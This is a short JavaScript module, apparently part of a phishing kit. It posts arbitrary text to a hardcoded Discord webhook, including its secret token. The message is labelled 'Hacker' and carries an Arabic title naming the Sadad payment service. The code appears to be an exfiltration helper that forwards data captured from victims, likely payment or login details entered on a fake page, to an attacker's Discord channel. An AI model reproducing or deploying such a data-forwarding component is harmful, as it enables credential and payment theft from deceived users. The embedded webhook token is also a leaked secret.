import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325134859533942804/N1t3-1BFZn3Vf6SS3L0Xa2cRDzvFZxuaIpr_ftr0AIPFK9lCzphEQgTfnTfCQ3dwGrNa",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
